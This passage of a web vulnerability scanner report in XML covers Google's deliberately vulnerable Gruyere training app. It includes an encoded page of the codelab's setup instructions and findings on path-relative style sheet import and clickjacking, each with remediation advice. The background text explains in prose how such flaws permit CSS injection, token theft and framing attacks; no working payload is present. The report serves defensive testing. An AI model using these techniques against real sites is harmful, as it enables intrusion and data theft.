9zX3ZpYV9hamF4Ij5Eb1MgdmlhIEFKQVg8L0E+PC9MST4KICA8TEkgY2xhc3M9IkwyIj4gPEEgaHJlZj0iL3BhcnQ1IzVfX3BoaXNoaW5nX3ZpYV9hamF4Ij5QaGlzaGluZyB2aWEgQUpBWDwvQT48L0xJPgogIDwvVUw+PC9MST4KPExJIGNsYXNzPSJMMSI+IDxBIGhyZWY9Ii9wYXJ0NSM1X19vdGhlcl92dWxuZXJhYmlsaXRpZXMiPiBPdGhlciBWdWxuZXJhYmlsaXRpZXMgPC9BPiA8L0gyPgogIDxVTD4KICA8TEkgY2xhc3M9IkwyIj4gPEEgaHJlZj0iL3BhcnQ1IzVfX2J1ZmZlcl9hbmRfaW50ZWdlcl9vdmVyZmxvdyI+QnVmZmVyIE92ZXJmbG93IGFuZCBJbnRlZ2VyIE92ZXJmbG93PC9BPjwvTEk+CiAgPExJIGNsYXNzPSJMMiI+IDxBIGhyZWY9Ii9wYXJ0NSM1X19zcWxfaW5qZWN0aW9uIj4gU1FMIEluamVjdGlvbiA8L0E+PC9MST4KICA8L1VMPjwvTEk+CjxMSSBjbGFzcz0iTDEiPiA8QSBocmVmPSIvcGFydDUjNV9fYWZ0ZXJfdGhlX2NvZGVsYWIiPkFmdGVyIHRoZSBDb2RlbGFiPC9BPjwvTEk+CjwvVUw+CjwvRElWPgo8RElWIGNsYXNzPSJjb2x1bW4yIj4KPFA+PC9QPgo8UD48L1A+CjxQPgo8Tk9BVVRPTElOSz4KPC9OT0FVVE9MSU5LPjwvUD4KCjxIMj48QSBuYW1lPSIxX19zZXR1cCI+IDwvQT4gU2V0dXAgPC9IMj4KPFA+ClRvIGFjY2VzcyBHcnV5ZXJlLCBnbyB0bwo8Q09ERT48QSBocmVmPSIvc3RhcnQiPmh0dHBzOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vc3RhcnQ8L0E+PC9DT0RFPi4KQXBwRW5naW5lIHdpbGwgc3RhcnQgYSBuZXcgaW5zdGFuY2Ugb2YgR3J1eWVyZSBmb3IgeW91LCBhc3NpZ24gaXQgYQp1bmlxdWUgaWQgYW5kIHJlZGlyZWN0IHlvdSB0bwo8Q09ERT5odHRwczovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzwhLS1kbyBub3QgcmVwbGFjZS0tPjEyMy88L0NPREU+Cih3aGVyZSA8Q09ERT4xMjM8L0NPREU+IGlzIHlvdXIgdW5pcXVlIGlkKS4gRWFjaCBpbnN0YW5jZSBvZiBHcnV5ZXJlCmlzICJzYW5kYm94ZWQiIGZyb20gdGhlIG90aGVyIGluc3RhbmNlcyBzbyB5b3VyIGluc3RhbmNlIHdvbid0IGJlCmFmZmVjdGVkIGJ5IGFueW9uZSBlbHNlIHVzaW5nIEdydXllcmUuIFlvdSdsbCBuZWVkIHRvIHVzZSB5b3VyCnVuaXF1ZSBpZCBpbnN0ZWFkIG9mIDxDT0RFPjEyMzwvQ09ERT4gaW4gYWxsIHRoZSBleGFtcGxlcy4gSWYgeW91IHdhbnQKdG8gc2hhcmUgeW91ciBpbnN0YW5jZSBvZiBHcnV5ZXJlIHdpdGggc29tZW9uZSBlbHNlIChlLmcuLCB0byBzaG93CnRoZW0gYSBzdWNjZXNzZnVsIGF0dGFjayksIGp1c3Qgc2hhcmUgdGhlIGZ1bGwgVVJMIHdpdGggdGhlbSBpbmNsdWRpbmcKeW91ciB1bmlxdWUgaWQuCjwvUD4KPFA+VGhlIEdydXllcmUgc291cmNlIGNvZGUgaXMgYXZhaWxhYmxlIG9ubGluZSBzbyB0aGF0IHlvdSBjYW4gdXNlCml0IGZvciB3aGl0ZS1ib3ggaGFja2luZy4gWW91IGNhbiBicm93c2UgdGhlIHNvdXJjZSBjb2RlCmF0IDxBIGhyZWY9Ii9jb2RlLyI+aHR0cHM6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS9jb2RlLzwvQT4gb3IgZG93bmxvYWQKYWxsIHRoZSBmaWxlcwpmcm9tIDxBIGhyZWY9Ii9ncnV5ZXJlLWNvZGUuemlwIj5odHRwczovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tL2dydXllcmUtY29kZS56aXA8L0E+LgpJZiB3YW50IHRvIGRlYnVnIGl0IG9yIGFjdHVhbGx5IHRyeSBmaXhpbmcgdGhlIGJ1Z3MsIHlvdSBjYW4gZG93bmxvYWQKaXQgYW5kIHJ1biBpdCBsb2NhbGx5LiBZb3UgZG8gbm90IG5lZWQgdG8gcnVuIEdydXllcmUgbG9jYWxseSBpbgpvcmRlciB0byBkbyB0aGUgbGFiLgo8L1A+CjxESVYgc3R5bGU9Im1hcmdpbi1sZWZ0OjE4cHQiPgo8SDQgc3R5bGU9ImN1cnNvcjogcG9pbnRlciIgb25jbGljaz0idG9nZ2xlQmxvY2sodGhpcywgJ3J1bm5pbmdfbG9jYWxseScpOyI+PElNRyBzcmM9Ii9zdGF0aWMvY2xvc2VkLmdpZiI+IFJ1bm5pbmcgbG9jYWxseSA8L0g0Pgo8RElWIGlkPSJydW5uaW5nX2xvY2FsbHkiIHN0eWxlPSJkaXNwbGF5Om5vbmUiPgo8UD4KPEZPTlQgY29sb3I9IiNmZjAwMDAiPgo8Qj5XQVJOSU5HOjwvQj4gQmVjYXVzZSBHcnV5ZXJlIGlzIHZlcnkgdnVsbmVyYWJsZSwgaXQKaW5jbHVkZXMgc29tZSBwcm90ZWN0aW9uIGFnYWluc3QgYmVpbmcgZXhwbG9pdGVkIGJ5IGFuIGV4dGVybmFsCmF0dGFja2VyIHdoZW4gcnVuIGxvY2FsbHkuIFlvdSdsbCBzZWUgdGhlc2UgcGFydHMgb2YgdGhlIGNvZGUgbWFya2VkCkRPIE5PVCBDSEFOR0UuIEdydXllcmUgb25seSBhY2NlcHRzIHJlcXVlc3RzIGZyb20gbG9jYWxob3N0IGFuZCB1c2VzCmEgcmFuZG9tIHVuaXF1ZSBpZCBpbiB0aGUgVVJMLiBIb3dldmVyLCBpdCdzIGRpZmZpY3VsdCB0byBmdWxseQpwcm90ZWN0IGFnYWluc3QgYW4gZXh0ZXJuYWwgYXR0YWNrLiBBbmQgaWYgeW91IG1ha2UgY2hhbmdlcyB0bwpHcnV5ZXJlIHlvdSBjb3VsZCBtYWtlIGl0IG1vcmUgdnVsbmVyYWJsZSB0byBhIHJlYWwKYXR0YWNrLiBUaGVyZWZvcmUsIHlvdSBzaG91bGQgY2xvc2Ugb3RoZXIgd2ViIHBhZ2VzIHdoaWxlIHJ1bm5pbmcKR3J1eWVyZSBsb2NhbGx5IGFuZCB5b3Ugc2hvdWxkIG1ha2Ugc3VyZSB0aGF0IG5vIG90aGVyIHVzZXIgaXMKbG9nZ2VkIGluIHRvIHRoZSBtYWNoaW5lIHlvdSBhcmUgdXNpbmcuCjwvRk9OVD4KPC9QPgo8UD4gVG8gcnVuIEdydXllcmUgbG9jYWxseSwgeW91J2xsIGZpcnN0IG5lZWQgdG8gaW5zdGFsbCBQeXRob24gMi43LAppZiB5b3UgZG9uJ3QgYWxyZWFkeSBoYXZlIGl0LiBHcnV5ZXJlIHdhcyBkZXZlbG9wZWQgYW5kIHRlc3RlZCB3aXRoCnZlcnNpb24gMi43IGFuZCBtYXkgbm90IHdvcmsgd2l0aCBvdGhlciB2ZXJzaW9ucyBvZiBQeXRob24uIFlvdSBjYW4KZG93bmxvYWQgaXQgZnJvbSA8QSBocmVmPSJodHRwczovL3d3dy5weXRob24ub3JnL2Rvd25sb2Fkcy8iCnRhcmdldD0iX3RvcCI+cHl0aG9uLm9yZzwvQT4uIERvd25sb2FkIEdydXllcmUgaXRzZWxmCmZyb20gPEEgaHJlZj0iL2dydXllcmUtY29kZS56aXAiPmh0dHBzOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vZ3J1eWVyZS1jb2RlLnppcDwvQT4KYW5kIHVucGFjayBpdCB0byB5b3VyIGxvY2FsIGRpc2suIFRoZW4gdG8gcnVuIHRoZSBhcHBsaWNhdGlvbiwgc2ltcGx5CnR5cGU6CjwvUD4KPFA+PC9QPgo8UFJFPgokIGNkICZsdDtncnV5ZXJlLWRpcmVjdG9yeSZndDsKJCAuL2dydXllcmUucHk8L1BSRT4KPFA+CllvdSdsbCBuZWVkIHRvIHJlcGxhY2UgPENPREU+Z29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb208L0NPREU+IGluIGFsbCB0aGUKZXhhbXBsZXMgd2l0aCA8Q09ERT5sb2NhbGhvc3Q6ODAwODwvQ09ERT4gaW4gYWRkaXRpb24gdG8KcmVwbGFjaW5nIDxDT0RFPjEyMzwvQ09ERT4gd2l0aCB5b3VyIHVuaXF1ZSBpZC4gTm90ZSB0aGF0IHRoZSB1bmlxdWUKaWQgYXBwZWFycyBpbiBhIGRpZmZlcmVudCBsb2NhdGlvbi4gVGhlcmUgYXJlIGEgZmV3IG90aGVyIHNtYWxsCmRpZmZlcmVuY2VzIGJldHdlZW4gcnVubmluZyBHcnV5ZXJlIGxvY2FsbHkgdnMuIGFjY2Vzc2luZyB0aGUKaW5zdGFuY2Ugb24gQXBwJm5ic3A7RW5naW5lLiBUaGUgbW9zdCBvYnZpb3VzIGlzIHRoYXQgdGhlCkFwcCZuYnNwO0VuZ2luZSB2ZXJzaW9uIHJ1bnMgaW4gYSBsaW1pdGVkIHNhbmRib3guIFNvIGlmIHlvdSBkbwpzb21ldGhpbmcgdGhhdCBwdXRzIEdydXllcmUgaW50byBhbiBpbmZpbml0ZSBsb29wLCB0aGUgbW9uaXRvciB3aWxsCmRldGVjdCBpdCBhbmQga2lsbCBpdC4gVGhhdCBtaWdodCBub3QgaGFwcGVuIHdoZW4geW91IHJ1biBpdCBsb2NhbGx5LApkZXBlbmRpbmcgb24gd2hhdCB0aGUgbG9vcCBpcyBkb2luZy4KPC9QPgo8L0RJVj4KPC9ESVY+CjxCUj4KPEgzPjxBIG5hbWU9IjFfX3Jlc2V0X2J1dHRvbiI+IDwvQT4gUmVzZXQgQnV0dG9uIDwvSDM+CkFzIG5vdGVkIGFib3ZlLCBlYWNoIGluc3RhbmNlIGlzIHNhbmRib3hlZCBzbyBpdCBjYW4ndCBjb25zdW1lCmluZmluaXRlIHJlc291cmNlcyBhbmQgaXQgY2FuJ3QgaW50ZXJmZXJlIHdpdGggYW55b25lIGVsc2UncwppbnN0YW5jZS4gTm90d2l0aHN0YW5kaW5nIHRoYXQsIGl0IGlzIHBvc3NpYmxlIHRvIHB1dCB5b3VyIEdydXllcmUKaW5zdGFuY2UgaW50byBhIHN0YXRlIHdoZXJlIGl0IGlzIGNvbXBsZXRlbHkgdW51c2FibGUuIElmIHRoYXQKaGFwcGVucywgeW91IGNhbiBwdXNoIGEgbWFnaWMgInJlc2V0IGJ1dHRvbiIgdG8gd2lwZSBvdXQgYWxsIHRoZSBkYXRhCmluIHlvdXIgaW5zdGFuY2UgYW5kIHN0YXJ0IGZyb20gc2NyYXRjaC4gVG8gZG8gdGhpcywgdmlzaXQgdGhpcwpVUkwgd2l0aCB5b3VyIGluc3RhbmNlIGlkOgo8UFJFPgpodHRwczovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tL3Jlc2V0YnV0dG9uLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNgo8L1BSRT4KPEJSPgo8SDM+PEEgbmFtZT0iMV9fYWJvdXRfdGhlX2NvZGUiPiA8L0E+IEFib3V0IHRoZSBDb2RlIDwvSDM+CjxQPgpHcnV5ZXJlIGlzIHNtYWxsIGFuZCBjb21wYWN0LiBIZXJlIGlzIGEgcXVpY2sgcnVuZG93biBvZiB0aGUKYXBwbGljYXRpb24gY29kZToKPC9QPjxVTD4KPExJPiA8Q09ERT48QSBocmVmPSIvY29kZS8/Z3J1eWVyZS5weSI+Z3J1eWVyZS5weTwvQT48L0NPREU+CmlzIHRoZSBtYWluIEdydXllcmUgd2ViIHNlcnZlcgo8L0xJPgo8TEk+IDxDT0RFPjxBIGhyZWY9Ii9jb2RlLz9kYXRhLnB5Ij5kYXRhLnB5PC9BPjwvQ09ERT4Kc3RvcmVzIHRoZSBkZWZhdWx0IGRhdGEgaW4gdGhlIGRhdGFiYXNlLiBUaGVyZSBpcyBhbiBhZG1pbmlzdHJhdG9yCmFjY291bnQgYW5kIHR3byBkZWZhdWx0IHVzZXJzLgo8L0xJPgo8TEk+IDxDT0RFPjxBIGhyZWY9Ii9jb2RlLz9ndGwucHkiPmd0bC5weTwvQT48L0NPREU+CmlzIHRoZSBHcnV5ZXJlIHRlbXBsYXRlIGxhbmd1YWdlCjwvTEk+CjxMST4gPENPREU+PEEgaHJlZj0iL2NvZGUvP3Nhbml0aXplLnB5Ij5zYW5pdGl6ZS5weTwvQT48L0NPREU+CmlzIHRoZSBHcnV5ZXJlIG1vZHVsZSB1c2VkIGZvciBzYW5pdGl6aW5nIEhUTUwgdG8gcHJvdGVjdCB0aGUKYXBwbGljYXRpb24gZnJvbSBzZWN1cml0eSBob2xlcy4KPC9MST4KPExJPiA8Q09ERT48QSBocmVmPSIvY29kZS8iPnJlc291cmNlcy8uLi48L0E+PC9DT0RFPgpob2xkcyBhbGwgdGVtcGxhdGUgZmlsZXMsIGltYWdlcywgQ1NTLCBldGMuCjwvTEk+CjwvVUw+CjxQPjwvUD4KPEJSPgo8SDM+PEEgbmFtZT0iMV9fZmVhdHVyZXNfYW5kX3RlY2hub2xvZ2llcyI+IDwvQT4gRmVhdHVyZXMgYW5kIFRlY2hub2xvZ2llcyA8L0gzPgo8UD4KR3J1eWVyZSBpbmNsdWRlcyBhIG51bWJlciBvZiBzcGVjaWFsIGZlYXR1cmVzIGFuZCB0ZWNobm9sb2dpZXMgd2hpY2gKYWRkIGF0dGFjayBzdXJmYWNlLiBXZSdsbCBoaWdobGlnaHQgdGhlbSBoZXJlIHNvIHlvdSdsbCBiZSBhd2FyZSBvZgp0aGVtIGFzIHlvdSB0cnkgdG8gYXR0YWNrIGl0LiBFYWNoIG9mIHRoZXNlIGludHJvZHVjZXMgbmV3CnZ1bG5lcmFiaWxpdGllcy4KPC9QPgo8UD48L1A+CjxVTD4KPExJPiBIVE1MIGluIFNuaXBwZXRzOiBVc2VycyBjYW4gaW5jbHVkZSBhIGxpbWl0ZWQgc3Vic2V0IG9mIEhUTUwgaW4KdGhlaXIgc25pcHBldHMuCjwvTEk+CjxMST4gRmlsZSB1cGxvYWQ6IFVzZXJzIGNhbiB1cGxvYWQgZmlsZXMgdG8gdGhlIHNlcnZlciwgZS5nLiwgdG8KaW5jbHVkZSBwaWN0dXJlcyBpbiB0aGVpciBzbmlwcGV0cy4KPC9MST4KPExJPiBXZWIgYWRtaW5pc3RyYXRpb246IFN5c3RlbSBhZG1pbmlzdHJhdG9ycyBjYW4gbWFuYWdlIHRoZSBzeXN0ZW0KdXNpbmcgYSB3ZWIgaW50ZXJmYWNlLgo8L0xJPgo8TEk+IE5ldyBhY2NvdW50czogVXNlcnMgY2FuIGNyZWF0ZSB0aGVpciBvd24gYWNjb3VudHMuCjwvTEk+CjxMST4gVGVtcGxhdGUgbGFuZ3VhZ2U6IEdydXllcmUgVGVtcGxhdGUgTGFuZ3VhZ2UoR1RMKSBpcyBhIG5ldwpsYW5ndWFnZSB0aGF0IG1ha2VzIHdyaXRpbmcgd2ViIHBhZ2VzIGVhc3kgYXMgdGhlIHRlbXBsYXRlcyBjb25uZWN0CmRpcmVjdGx5IHRvIHRoZSBkYXRhYmFzZS4gRG9jdW1lbnRhdGlvbiBmb3IgR1RMIGNhbiBiZSBmb3VuZAppbiA8Q09ERT48QSBocmVmPSIvY29kZS8/Z3RsLnB5Ij5ncnV5ZXJlL2d0bC5weTwvQT48L0NPREU+Lgo8L0xJPgo8TEk+IEFKQVg6IEdydXllcmUgdXNlcyBBSkFYIHRvIGltcGxlbWVudCByZWZyZXNoIG9uIHRoZSBob21lIGFuZApzbmlwcGV0cyBwYWdlLiBZb3Ugc2hvdWxkIGlnbm9yZSB0aGUgQUpBWCBwYXJ0cyBvZiBHcnV5ZXJlIGV4Y2VwdApmb3IgdGhlIGNoYWxsZW5nZXMgdGhhdCBzcGVjaWZpY2FsbHkgdGVsbCB5b3UgdG8gZm9jdXMgb24gQUpBWC4KPFVMPgo8TEk+IEluIGEgcmVhbCBhcHBsaWNhdGlvbiwgcmVmcmVzaCB3b3VsZCBwcm9iYWJseSBoYXBwZW4KYXV0b21hdGljYWxseSwgYnV0IGluIEdydXllcmUgd2UndmUgbWFkZSBpdCBtYW51YWwgc28gdGhhdCB5b3UgY2FuCmJlIGluIGNvbXBsZXRlIGNvbnRyb2wgd2hpbGUgeW91IGFyZSB3b3JraW5nIHdpdGggaXQuICBXaGVuIHlvdSBjbGljawp0aGUgcmVmcmVzaCBsaW5rLCBHcnV5ZXJlCmZldGNoZXMgPENPREU+PEEgaHJlZj0iL2NvZGUvP3Jlc291cmNlcy9mZWVkLmd0bCI+ZmVlZC5ndGw8L0E+PC9DT0RFPgp3aGljaCBjb250YWlucyByZWZyZXNoIGRhdGEgZm9yIHRoZSBjdXJyZW50IHBhZ2UgYW5kIHRoZW4gY2xpZW50LXNpZGUKc2NyaXB0IHVzZXMgdGhlIGJyb3dzZXIgRE9NIEFQSSAoRG9jdW1lbnQgT2JqZWN0IE1vZGVsKSB0byBpbnNlcnQgdGhlCm5ldyBzbmlwcGV0cyBpbnRvIHRoZSBwYWdlLiBTaW5jZSBBSkFYIHJ1bnMgY29kZSBvbiB0aGUgY2xpZW50IHNpZGUsCnRoaXMgc2NyaXB0IGlzIHZpc2libGUgdG8gYXR0YWNrZXJzIHdobyBkbyBub3QgaGF2ZSBhY2Nlc3MgdG8geW91cgpzb3VyY2UgY29kZS4KPC9MST4KPC9VTD4KPC9MST4KPC9VTD4KPFA+PC9QPgo8QlI+CjxIMj48QSBuYW1lPSIxX191c2luZ19ncnV5ZXJlIj4gPC9BPiBVc2luZyBHcnV5ZXJlIDwvSDI+CjxQPgpUbyBmYW1pbGlhcml6ZSB5b3Vyc2VsZiB3aXRoIHRoZSBmZWF0dXJlcyBvZiBHcnV5ZXJlLCBjb21wbGV0ZSB0aGUKZm9sbG93aW5nIHRhc2tzOgo8L1A+CjxQPjwvUD4KPFVMPgo8TEk+IFZpZXcgYW5vdGhlciB1c2VyJ3Mgc25pcHBldHMgYnkgZm9sbG93aW5nIHRoZSAiQWxsIHNuaXBwZXRzIiBsaW5rCm9uIHRoZSBtYWluIHBhZ2UuIEFsc28gY2hlY2sgb3V0IHdoYXQgdGhleSBoYXZlIHRoZWlyIEhvbWVwYWdlIHNldCB0by4KPC9MST4KPExJPiBTaWduIHVwIGZvciBhbiBhY2NvdW50IGZvciB5b3Vyc2VsZiB0byB1c2Ugd2hlbgpoYWNraW5nLiA8Qj5EbyBub3QgdXNlIHRoZSBzYW1lIHBhc3N3b3JkIGZvciB5b3VyIEdydXllcmUKYWNjb3VudCBhcyB5b3UgdXNlIGZvciBhbnkgcmVhbCBzZXJ2aWNlLjwvQj4KPC9MST4KPExJPiBGaWxsIGluIHlvdXIgYWNjb3VudCdzIHByb2ZpbGUsIGluY2x1ZGluZyBhIHByaXZhdGUgc25pcHBldCBhbmQKYW4gaWNvbiB0aGF0IHdpbGwgYmUgZGlzcGxheWVkIGJ5IHlvdXIgbmFtZS4KPC9MST4KPExJPiBDcmVhdGUgYSBzbmlwcGV0ICh2aWEgIk5ldyBTbmlwcGV0IikgY29udGFpbmluZyB5b3VyIGZhdm9yaXRlCmpva2UuCjwvTEk+CjxMST4gVXBsb2FkIGEgZmlsZSAodmlhICJVcGxvYWQiKSB0byB5b3VyIGFjY291bnQuCjwvTEk+CjwvVUw+CjxQPjwvUD4KPFA+IFRoaXMgY292ZXJzIHRoZSBiYXNpYyBmZWF0dXJlcyBwcm92aWRlZCBieSBHcnV5ZXJlLiBOb3cKbGV0J3MgYnJlYWsgdGhlbSEKPC9QPgo8QlI+PFA+PC9QPgoKCiAgICAgICAgICAgICA8Rk9OVCBTSVpFPSIrMiI+CiAgICAgICAgICAgICA8QSBocmVmPSIvcGFydDIiPkNvbnRpbnVlICZndDsmZ3Q7PC9BPgogICAgICAgICAgICAgPC9GT05UPjxCUj4KPEJSPgo8UCBzdHlsZT0iZm9udC1zaXplOngtc21hbGwiPgomY29weTsgR29vZ2xlIDIwMTcgPEEgaHJlZj0iaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9pbnRsL2VuL3BvbGljaWVzL3Rlcm1zLyI+VGVybXMgb2YgU2VydmljZTwvQT4KPEJSPlRoZSBjb2RlIHBvcnRpb25zIG9mIHRoaXMgY29kZWxhYiBhcmUgbGljZW5zZWQgdW5kZXIgdGhlCkNyZWF0aXZlIENvbW1vbnMgQXR0cmlidXRpb24tTm8gRGVyaXZhdGl2ZSBXb3JrcyAzLjAgVW5pdGVkIFN0YXRlcyBsaWNlbnNlCiZsdDs8QSBocmVmPSJodHRwczovL2NyZWF0aXZlY29tbW9ucy5vcmcvbGljZW5zZXMvYnktbmQvMy4wL3VzLyI+aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5kLzMuMC91czwvQT4mZ3Q7LgpCcmllZiBleGNlcnB0cyBvZiB0aGUgY29kZSBtYXkgYmUgdXNlZCBmb3IgZWR1Y2F0aW9uYWwgb3IKaW5zdHJ1Y3Rpb25hbCBwdXJwb3NlcyBwcm92aWRlZCB0aGlzIG5vdGljZSBpcyBrZXB0IGludGFjdC4KRXhjZXB0IGFzIG90aGVyd2lzZSBub3RlZCB0aGUgcmVtYWluZGVyIG9mIHRoaXMgY29kZWxhYiBpcyBsaWNlbnNlZCB1bmRlciB0aGUKQ3JlYXRpdmUgQ29tbW9ucyBBdHRyaWJ1dGlvbiAzLjAgVW5pdGVkIFN0YXRlcyBsaWNlbnNlCiZsdDs8QSBocmVmPSJodHRwczovL2NyZWF0aXZlY29tbW9ucy5vcmcvbGljZW5zZXMvYnkvMy4wL3VzLyI+aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LzMuMC91czwvQT4mZ3Q7Lgo8L1A+CjwvQk9EWT48L0hUTUw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>56845718747982336</serialNumber>
    <type>2097960</type>
    <name><![CDATA[Path-relative style sheet import]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/part1]]></path>
    <location><![CDATA[/part1]]></location>
    <severity>Information</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: no sniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blog.portswigger.net/2015/02/prssi.html">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9wYXJ0MSBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS8NCg0K]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>83050890876911776</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/part2]]></path>
    <location><![CDATA[/part2]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9wYXJ0MiBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS8NCg0K]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7765687605281730560</serialNumber>
    <type>2097960</type>
    <name><![CDATA[Path-relative style sheet import]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/part2]]></path>
    <location><![CDATA[/part2]]></location>
    <severity>Information</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
